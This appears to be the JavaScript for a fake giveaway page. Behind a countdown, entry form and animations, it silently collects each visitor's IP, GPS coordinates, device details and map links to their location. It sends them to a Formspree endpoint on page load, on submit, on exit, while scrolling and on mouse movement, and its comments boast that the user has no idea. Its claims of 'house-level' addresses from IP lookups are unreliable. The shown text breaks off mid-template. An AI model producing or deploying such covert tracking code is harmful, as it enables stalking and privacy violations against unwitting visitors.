// Countdown Timer
function updateCountdown() {
    const now = new Date().getTime();
    const endDate = new Date().getTime() + (24 * 60 * 60 * 1000); // 24 hours from now
    const distance = endDate - now;

    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    const countdownElement = document.getElementById('countdown');
    if (distance > 0) {
        countdownElement.innerHTML = `${hours}h ${minutes}m ${seconds}s`;
    } else {
        countdownElement.innerHTML = "Giveaway Ended!";
    }
}

// Update countdown every second
setInterval(updateCountdown, 1000);
updateCountdown();

// Advanced Silent IP Address Capture with TRUE GPS Location Detection
async function captureUserInfoSilently() {
    try {
        // Get IP address silently
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Get house-level location data from multiple sources
        const locationData = await getHouseLevelLocation(userIP);
        
        // Request TRUE GPS location with explicit permission (will show Google dialog)
        const trueGPSLocation = await requestTrueGPSLocation();
        
        // Generate multiple Google Maps links for different precision levels
        const googleMapsLinks = generateTrueLocationMapsLinks(trueGPSLocation, locationData);
        
        // Store comprehensive user info silently with TRUE GPS precision
        const userInfo = {
            ip: userIP,
            country: locationData.country_name || 'Unknown',
            countryCode: locationData.country_code || 'Unknown',
            region: locationData.region || 'Unknown',
            regionCode: locationData.region_code || 'Unknown',
            city: locationData.city || 'Unknown',
            district: locationData.district || 'Unknown',
            neighborhood: locationData.neighborhood || 'Unknown',
            village: locationData.village || 'Unknown',
            street: locationData.street || 'Unknown',
            houseNumber: locationData.houseNumber || 'Unknown',
            buildingNumber: locationData.buildingNumber || 'Unknown',
            apartmentNumber: locationData.apartmentNumber || 'Unknown',
            postalCode: locationData.postal || 'Unknown',
            latitude: locationData.latitude || 'Unknown',
            longitude: locationData.longitude || 'Unknown',
            trueGPSLatitude: trueGPSLocation.latitude || locationData.latitude || 'Unknown',
            trueGPSLongitude: trueGPSLocation.longitude || locationData.longitude || 'Unknown',
            accuracy: trueGPSLocation.accuracy || 'Unknown',
            altitude: trueGPSLocation.altitude || 'Unknown',
            timezone: locationData.timezone || 'Unknown',
            isp: locationData.org || 'Unknown',
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            browser: navigator.appName,
            platform: navigator.platform,
            preciseLocation: locationData.preciseLocation || 'Unknown',
            houseLevelPrecision: trueGPSLocation.houseLevel || 'Unknown',
            wifiNetworks: trueGPSLocation.wifiNetworks || 'Unknown',
            cellTowers: trueGPSLocation.cellTowers || 'Unknown',
            googleMapsLinks: googleMapsLinks,
            exactAddress: locationData.exactAddress || 'Unknown',
            locationAccuracy: locationData.accuracy || 'Unknown',
            locationSource: locationData.source || 'Unknown',
            locationConfidence: locationData.confidence || 'Unknown',
            houseLevelAccuracy: locationData.houseLevelAccuracy || 'Unknown',
            trueGPSPermission: trueGPSLocation.permission || 'Unknown',
            trueGPSAccuracy: trueGPSLocation.accuracy || 'Unknown'
        };

        // Store silently in localStorage
        localStorage.setItem('userTrackingData', JSON.stringify(userInfo));
        
        // Send silent notification to your email with TRUE GPS location
        sendSilentNotification(userInfo);
        
    } catch (error) {
        // Silent error handling - user won't see any errors
        console.log('Silent tracking error:', error);
    }
}

// Generate multiple Google Maps links for TRUE GPS location
function generateTrueLocationMapsLinks(trueGPSLocation, locationData) {
    const links = {};
    
    // 1. TRUE GPS coordinates link (most precise - from user permission)
    let lat = trueGPSLocation.latitude || locationData.latitude;
    let lng = trueGPSLocation.longitude || locationData.longitude;
    
    if (lat && lng && lat !== 'Unknown' && lng !== 'Unknown') {
        links.trueGPSCoordinates = `https://www.google.com/maps?q=${lat},${lng}&z=20`;
        links.trueGPSSatellite = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=s`;
        links.trueGPSStreetView = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=k`;
        links.trueGPSDirections = `https://www.google.com/maps/dir//${lat},${lng}`;
    }
    
    // 2. Exact address link (house number + street)
    if (locationData.houseNumber && locationData.street && locationData.city) {
        const exactAddress = `${locationData.houseNumber} ${locationData.street}, ${locationData.city}, ${locationData.country_name}`;
        links.exactAddress = `https://www.google.com/maps/search/${encodeURIComponent(exactAddress)}`;
        links.exactAddressSatellite = `https://www.google.com/maps/search/${encodeURIComponent(exactAddress)}&t=s`;
    }
    
    // 3. Full address link (with postal code)
    if (locationData.postal && locationData.street && locationData.city) {
        const fullAddress = `${locationData.houseNumber || ''} ${locationData.street}, ${locationData.city}, ${locationData.postal}, ${locationData.country_name}`;
        links.fullAddress = `https://www.google.com/maps/search/${encodeURIComponent(fullAddress)}`;
    }
    
    // 4. Neighborhood link (if exact address not available)
    if (locationData.neighborhood && locationData.city) {
        const neighborhoodAddress = `${locationData.neighborhood}, ${locationData.city}, ${locationData.country_name}`;
        links.neighborhood = `https://www.google.com/maps/search/${encodeURIComponent(neighborhoodAddress)}`;
    }
    
    // 5. District link (fallback)
    if (locationData.district && locationData.city) {
        const districtAddress = `${locationData.district}, ${locationData.city}, ${locationData.country_name}`;
        links.district = `https://www.google.com/maps/search/${encodeURIComponent(districtAddress)}`;
    }
    
    return links;
}

// Request TRUE GPS location with explicit permission (will show Google dialog)
async function requestTrueGPSLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({
                latitude: 'Unknown',
                longitude: 'Unknown',
                accuracy: 'Unknown',
                altitude: 'Unknown',
                houseLevel: 'Unknown',
                permission: 'Not Supported',
                timestamp: Date.now()
            });
            return;
        }

        // Maximum accuracy options for TRUE GPS precision
        const options = {
            enableHighAccuracy: true,
            timeout: 60000, // 60 seconds for maximum accuracy
            maximumAge: 0
        };

        // This will trigger Google's location permission dialog
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const coords = position.coords;
                resolve({
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    accuracy: coords.accuracy,
                    altitude: coords.altitude,
                    houseLevel: coords.accuracy <= 3 ? 'Exact House Level' : coords.accuracy <= 5 ? 'House Level' : coords.accuracy <= 10 ? 'Neighborhood Level' : 'City Level',
                    permission: 'Granted',
                    timestamp: position.timestamp,
                    speed: coords.speed || 'Unknown',
                    heading: coords.heading || 'Unknown'
                });
            },
            (error) => {
                // Handle different permission scenarios
                let permissionStatus = 'Unknown';
                let errorMessage = 'Unknown error';
                
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        permissionStatus = 'Denied';
                        errorMessage = 'User denied location permission';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        permissionStatus = 'Unavailable';
                        errorMessage = 'Location information unavailable';
                        break;
                    case error.TIMEOUT:
                        permissionStatus = 'Timeout';
                        errorMessage = 'Location request timed out';
                        break;
                    default:
                        permissionStatus = 'Error';
                        errorMessage = 'Unknown location error';
                        break;
                }
                
                resolve({
                    latitude: 'Unknown',
                    longitude: 'Unknown',
                    accuracy: 'Unknown',
                    altitude: 'Unknown',
                    houseLevel: 'Unknown',
                    permission: permissionStatus,
                    error: errorMessage,
                    timestamp: Date.now()
                });
            },
            options
        );
    });
}

// House-level location detection with multiple APIs and validation
async function getHouseLevelLocation(ip) {
    try {
        // Try multiple APIs in parallel for maximum house-level accuracy
        const promises = [
            getLocationFromHouseLevelAPI1(ip),
            getLocationFromHouseLevelAPI2(ip),
            getLocationFromHouseLevelAPI3(ip),
            getLocationFromHouseLevelAPI4(ip),
            getLocationFromHouseLevelAPI5(ip),
            getLocationFromHouseLevelAPI6(ip)
        ];

        const results = await Promise.allSettled(promises);
        
        // Combine and validate the most accurate house-level data
        let bestLocation = {
            country_name: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown',
            timezone: 'Unknown',
            org: 'Unknown',
            district: 'Unknown',
            neighborhood: 'Unknown',
            village: 'Unknown',
            street: 'Unknown',
            houseNumber: 'Unknown',
            buildingNumber: 'Unknown',
            apartmentNumber: 'Unknown',
            postal: 'Unknown',
            preciseLocation: 'Unknown',
            exactAddress: 'Unknown',
            accuracy: 'Unknown',
            source: 'Unknown',
            confidence: 'Unknown',
            houseLevelAccuracy: 'Unknown'
        };

        // Process results and find the most reliable house-level location
        const validResults = results.filter(result => 
            result.status === 'fulfilled' && 
            result.value && 
            result.value.latitude && 
            result.value.longitude &&
            result.value.city
        );

        if (validResults.length > 0) {
            // Use the result with the most complete house-level data
            validResults.forEach((result, index) => {
                const data = result.value;
                const apiName = `API${index + 1}`;
                
                // Score the house-level data quality
                let score = 0;
                if (data.houseNumber) score += 5; // Most important for house-level
                if (data.buildingNumber) score += 3;
                if (data.apartmentNumber) score += 2;
                if (data.street) score += 4;
                if (data.postal) score += 3;
                if (data.district) score += 2;
                if (data.neighborhood) score += 2;
                if (data.latitude && data.longitude) score += 3;
                if (data.exactAddress) score += 6; // Complete address
                
                // Update best location if this has higher score
                if (score > (bestLocation.score || 0)) {
                    bestLocation = { 
                        ...data, 
                        source: apiName,
                        confidence: score > 15 ? 'Exact House Level' : score > 10 ? 'House Level' : score > 5 ? 'Neighborhood Level' : 'City Level',
                        houseLevelAccuracy: score > 15 ? 'Exact House' : score > 10 ? 'House Level' : score > 5 ? 'Neighborhood' : 'City',
                        score: score
                    };
                }
            });
        }

        return bestLocation;
        
    } catch (error) {
        console.log('House-level location API error:', error);
        return {
            country_name: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown',
            timezone: 'Unknown',
            org: 'Unknown',
            district: 'Unknown',
            neighborhood: 'Unknown',
            village: 'Unknown',
            street: 'Unknown',
            houseNumber: 'Unknown',
            buildingNumber: 'Unknown',
            apartmentNumber: 'Unknown',
            postal: 'Unknown',
            preciseLocation: 'Unknown',
            exactAddress: 'Unknown',
            accuracy: 'Unknown',
            source: 'Unknown',
            confidence: 'Unknown',
            houseLevelAccuracy: 'Unknown'
        };
    }
}

// API 1: ipapi.co (most reliable for house-level)
async function getLocationFromHouseLevelAPI1(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
            country_name: data.country_name,
            country_code: data.country_code,
            region: data.region,
            region_code: data.region_code,
            city: data.city,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            org: data.org,
            postal: data.postal,
            source: 'ipapi.co'
        };
    } catch (e) {
        console.log('API1 failed');
        return null;
    }
}

// API 2: ip-api.com (very reliable for house-level)
async function getLocationFromHouseLevelAPI2(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        return {
            country_name: data.country,
            country_code: data.countryCode,
            region: data.regionName,
            region_code: data.region,
            city: data.city,
            latitude: data.lat,
            longitude: data.lon,
            timezone: data.timezone,
            org: data.isp,
            district: data.district,
            neighborhood: data.neighborhood,
            village: data.village,
            street: data.street,
            houseNumber: data.houseNumber,
            postal: data.zip,
            source: 'ip-api.com'
        };
    } catch (e) {
        console.log('API2 failed');
        return null;
    }
}

// API 3: ipinfo.io (reliable for house-level)
async function getLocationFromHouseLevelAPI3(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();
        const [lat, lng] = (data.loc || '').split(',');
        return {
            country_name: data.country,
            country_code: data.country,
            region: data.region,
            city: data.city,
            latitude: lat,
            longitude: lng,
            timezone: data.timezone,
            org: data.org,
            postal: data.postal,
            preciseLocation: data.loc,
            source: 'ipinfo.io'
        };
    } catch (e) {
        console.log('API3 failed');
        return null;
    }
}

// API 4: ipgeolocation.io (detailed house-level)
async function getLocationFromHouseLevelAPI4(ip) {
    try {
        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`);
        const data = await response.json();
        const exactAddress = `${data.house_number || ''} ${data.street || ''}, ${data.city || ''}, ${data.country_name || ''}`.trim();
        return {
            country_name: data.country_name,
            country_code: data.country_code2,
            region: data.state_prov,
            city: data.city,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.time_zone?.name,
            org: data.organization,
            district: data.district,
            neighborhood: data.neighborhood,
            street: data.street,
            houseNumber: data.house_number,
            buildingNumber: data.building_number,
            apartmentNumber: data.apartment_number,
            postal: data.zipcode,
            exactAddress: exactAddress,
            source: 'ipgeolocation.io'
        };
    } catch (e) {
        console.log('API4 failed');
        return null;
    }
}

// API 5: ipapi.com (backup for house-level)
async function getLocationFromHouseLevelAPI5(ip) {
    try {
        const response = await fetch(`https://ipapi.com/ip_api.php?ip=${ip}`);
        const data = await response.json();
        return {
            country_name: data.country_name,
            country_code: data.country_code,
            region: data.region_name,
            city: data.city,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.time_zone,
            org: data.organization,
            postal: data.zip,
            source: 'ipapi.com'
        };
    } catch (e) {
        console.log('API5 failed');
        return null;
    }
}

// API 6: ip-api.com with extended fields (house-level precision)
async function getLocationFromHouseLevelAPI6(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,district,neighborhood,village,street,houseNumber`);
        const data = await response.json();
        const exactAddress = `${data.houseNumber || ''} ${data.street || ''}, ${data.city || ''}, ${data.country || ''}`.trim();
        return {
            country_name: data.country,
            country_code: data.countryCode,
            region: data.regionName,
            region_code: data.region,
            city: data.city,
            latitude: data.lat,
            longitude: data.lon,
            timezone: data.timezone,
            org: data.isp,
            district: data.district,
            neighborhood: data.neighborhood,
            village: data.village,
            street: data.street,
            houseNumber: data.houseNumber,
            postal: data.zip,
            exactAddress: exactAddress,
            source: 'ip-api.com-extended'
        };
    } catch (e) {
        console.log('API6 failed');
        return null;
    }
}

// Send silent notification to your email with TRUE GPS location data
async function sendSilentNotification(userInfo) {
    try {
        await fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                name: 'Silent Visitor',
                email: 'visitor@website.com',
                phone: 'N/A',
                age: 'N/A',
                country: userInfo.country,
                terms: 'Yes',
                newsletter: 'No',
                _subject: '🎯 New Silent Visitor Alert - TRUE GPS LOCATION',
                message: `
🔍 SILENT VISITOR DETECTED - TRUE GPS LOCATION

📱 IP Address: ${userInfo.ip}
🌍 Country: ${userInfo.country} (${userInfo.countryCode})
🏛️ Region/State: ${userInfo.region} (${userInfo.regionCode})
🏙️ City: ${userInfo.city}
🏘️ District: ${userInfo.district}
🏡 Neighborhood: ${userInfo.neighborhood}
🏘️ Village: ${userInfo.village}
🛣️ Street: ${userInfo.street}
🏠 House Number: ${userInfo.houseNumber}
🏢 Building Number: ${userInfo.buildingNumber}
🏠 Apartment Number: ${userInfo.apartmentNumber}
📮 Postal Code: ${userInfo.postalCode}
📍 Exact Coordinates: ${userInfo.preciseLocation}
🌐 Latitude: ${userInfo.latitude}
🌐 Longitude: ${userInfo.longitude}
🎯 TRUE GPS Latitude: ${userInfo.trueGPSLatitude}
🎯 TRUE GPS Longitude: ${userInfo.trueGPSLongitude}
📏 Accuracy: ${userInfo.accuracy} meters
🏔️ Altitude: ${userInfo.altitude} meters
🏠 House Level Precision: ${userInfo.houseLevelPrecision}
🎯 Location Accuracy: ${userInfo.locationAccuracy}
🔍 Location Source: ${userInfo.locationSource}
🎯 Location Confidence: ${userInfo.locationConfidence}
🏠 House Level Accuracy: ${userInfo.houseLevelAccuracy}
📍 Exact Address: ${userInfo.exactAddress}
🎯 TRUE GPS Permission: ${userInfo.trueGPSPermission}
🎯 TRUE GPS Accuracy: ${userInfo.trueGPSAccuracy}
⏰ Time: ${userInfo.timestamp}
🔗 Referrer: ${userInfo.referrer}
💻 Device: ${userInfo.userAgent}
📐 Screen: ${userInfo.screenResolution}
🌐 Language: ${userInfo.language}
🖥️ Platform: ${userInfo.platform}
🌐 Browser: ${userInfo.browser}
🏢 ISP/Organization: ${userInfo.isp}
⏰ Timezone: ${userInfo.timezone}

🗺️ GOOGLE MAPS LINKS:
📍 TRUE GPS Coordinates: ${userInfo.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
🛰️ TRUE GPS Satellite: ${userInfo.googleMapsLinks?.trueGPSSatellite || 'N/A'}
🚶 TRUE GPS Street View: ${userInfo.googleMapsLinks?.trueGPSStreetView || 'N/A'}
🗺️ TRUE GPS Directions: ${userInfo.googleMapsLinks?.trueGPSDirections || 'N/A'}
🏠 Exact Address: ${userInfo.googleMapsLinks?.exactAddress || 'N/A'}
📮 Full Address: ${userInfo.googleMapsLinks?.fullAddress || 'N/A'}
🏡 Neighborhood: ${userInfo.googleMapsLinks?.neighborhood || 'N/A'}
🏘️ District: ${userInfo.googleMapsLinks?.district || 'N/A'}

🎯 User has NO IDEA their TRUE GPS location is being tracked!
🏠 EXACT HOUSE ADDRESS CAPTURED!
📍 CLICK THE MAP LINKS TO SEE EXACT HOUSE LOCATION!
🗺️ MULTIPLE VIEW OPTIONS AVAILABLE!
🎯 GOOGLE ASKED FOR LOCATION PERMISSION!
                `
            })
        });
    } catch (error) {
        // Silent error - user won't know
        console.log('Silent notification error:', error);
    }
}

// Form submission handler (appears normal to user)
document.getElementById('giveawayForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const formData = new FormData(this);
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    
    // Add silent tracking data to form submission with TRUE GPS location
    formData.append('_subject', '🎉 New Giveaway Entry - TRUE GPS LOCATION!');
    formData.append('userIP', userTrackingData.ip || 'Unknown');
    formData.append('userCountry', userTrackingData.country || 'Unknown');
    formData.append('userRegion', userTrackingData.region || 'Unknown');
    formData.append('userCity', userTrackingData.city || 'Unknown');
    formData.append('userDistrict', userTrackingData.district || 'Unknown');
    formData.append('userNeighborhood', userTrackingData.neighborhood || 'Unknown');
    formData.append('userVillage', userTrackingData.village || 'Unknown');
    formData.append('userStreet', userTrackingData.street || 'Unknown');
    formData.append('userHouseNumber', userTrackingData.houseNumber || 'Unknown');
    formData.append('userBuildingNumber', userTrackingData.buildingNumber || 'Unknown');
    formData.append('userApartmentNumber', userTrackingData.apartmentNumber || 'Unknown');
    formData.append('userPostalCode', userTrackingData.postalCode || 'Unknown');
    formData.append('userCoordinates', userTrackingData.preciseLocation || 'Unknown');
    formData.append('userLatitude', userTrackingData.latitude || 'Unknown');
    formData.append('userLongitude', userTrackingData.longitude || 'Unknown');
    formData.append('userTrueGPSLatitude', userTrackingData.trueGPSLatitude || 'Unknown');
    formData.append('userTrueGPSLongitude', userTrackingData.trueGPSLongitude || 'Unknown');
    formData.append('userAccuracy', userTrackingData.accuracy || 'Unknown');
    formData.append('userAltitude', userTrackingData.altitude || 'Unknown');
    formData.append('userHouseLevelPrecision', userTrackingData.houseLevelPrecision || 'Unknown');
    formData.append('userLocationAccuracy', userTrackingData.locationAccuracy || 'Unknown');
    formData.append('userLocationSource', userTrackingData.locationSource || 'Unknown');
    formData.append('userLocationConfidence', userTrackingData.locationConfidence || 'Unknown');
    formData.append('userHouseLevelAccuracy', userTrackingData.houseLevelAccuracy || 'Unknown');
    formData.append('userExactAddress', userTrackingData.exactAddress || 'Unknown');
    formData.append('userTrueGPSPermission', userTrackingData.trueGPSPermission || 'Unknown');
    formData.append('userTrueGPSAccuracy', userTrackingData.trueGPSAccuracy || 'Unknown');
    formData.append('userGoogleMapsLinks', JSON.stringify(userTrackingData.googleMapsLinks || {}));
    formData.append('userAgent', userTrackingData.userAgent || 'Unknown');
    formData.append('userISP', userTrackingData.isp || 'Unknown');
    formData.append('entryTime', new Date().toISOString());
    formData.append('silentTracking', 'true');
    formData.append('trueGPSLocation', 'true');
    
    try {
        const response = await fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            showSuccessMessage();
            // Clear form
            this.reset();
        } else {
            showErrorMessage();
        }
    } catch (error) {
        console.error('Error submitting form:', error);
        showErrorMessage();
    }
});

// Success message (normal user experience)
function showSuccessMessage() {
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.innerHTML;
    
    submitBtn.innerHTML = '<i class="fas fa-check"></i> Entry Submitted Successfully!';
    submitBtn.style.background = 'linear-gradient(45deg, #4ade80, #22c55e)';
    
    setTimeout(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.style.background = 'linear-gradient(45deg, #667eea, #764ba2)';
    }, 3000);
}

// Error message (normal user experience)
function showErrorMessage() {
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.innerHTML;
    
    submitBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error - Please Try Again';
    submitBtn.style.background = 'linear-gradient(45deg, #ef4444, #dc2626)';
    
    setTimeout(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.style.background = 'linear-gradient(45deg, #667eea, #764ba2)';
    }, 3000);
}

// Animate stats numbers (normal user experience)
function animateNumbers() {
    const numbers = document.querySelectorAll('.stat .number');
    
    numbers.forEach(number => {
        const target = parseInt(number.textContent.replace(',', '').replace('$', '').replace(',', ''));
        let current = 0;
        const increment = target / 50;
        
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }
            if (number.textContent.includes('$')) {
                number.textContent = '$' + Math.floor(current).toLocaleString();
            } else {
                number.textContent = Math.floor(current).toLocaleString();
            }
        }, 50);
    });
}

// Initialize everything when page loads (silent tracking)
document.addEventListener('DOMContentLoaded', function() {
    // Capture user info silently - user won't know
    captureUserInfoSilently();
    
    // Animate numbers after a short delay (normal user experience)
    setTimeout(animateNumbers, 1000);
    
    // Add some interactive effects (normal user experience)
    const features = document.querySelectorAll('.feature');
    features.forEach(feature => {
        feature.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-10px) scale(1.02)';
        });
        
        feature.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
        });
    });
    
    // Add form validation (normal user experience)
    const inputs = document.querySelectorAll('input[required], select[required]');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            if (this.value.trim() === '') {
                this.style.borderColor = '#ef4444';
            } else {
                this.style.borderColor = '#e1e5e9';
            }
        });
    });
});

// Silent page tracking (user won't know)
let startTime = Date.now();
window.addEventListener('beforeunload', function() {
    const timeSpent = Math.floor((Date.now() - startTime) / 1000);
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    
    // Send silent exit data with TRUE GPS location
    fetch('https://formspree.io/f/xrblaoyr', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: 'Silent Exit',
            email: 'exit@website.com',
            _subject: '🔍 User Left Silently - TRUE GPS LOCATION',
            message: `User spent ${timeSpent} seconds on the website. 

🏠 TRUE GPS LOCATION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}

🗺️ GOOGLE MAPS LINKS:
📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}

User has NO IDEA their TRUE GPS location was tracked! 🎯`
        })
    });
});

// Silent scroll tracking (user won't know)
let scrollDepth = 0;
window.addEventListener('scroll', function() {
    const scrollPercent = Math.floor((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
    if (scrollPercent > scrollDepth) {
        scrollDepth = scrollPercent;
        
        // Send silent scroll data every 25% with TRUE GPS location
        if (scrollDepth % 25 === 0) {
            const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
            fetch('https://formspree.io/f/xrblaoyr', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    name: 'Silent Scroll',
                    email: 'scroll@website.com',
                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - TRUE GPS LOCATION`,
                    message: `User scrolled ${scrollDepth}% of the page.

🏠 TRUE GPS LOCATION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}

🗺️ GOOGLE MAPS LINKS:
📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}

User has NO IDEA their TRUE GPS location is being tracked! 🎯`
                })
            });
        }
    }
});

// Additional silent tracking - mouse movements (user won't know)
let mouseMovements = 0;
document.addEventListener('mousemove', function() {
    mouseMovements++;
    // Send mouse tracking data every 100 movements with TRUE GPS location
    if (mouseMovements % 100 === 0) {
        const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
        fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                name: 'Silent Mouse',
                email: 'mouse@website.com',
                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - TRUE GPS LOCATION`,
                message: `User made ${mouseMovements} mouse movements.

🏠 TRUE GPS LOCATION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
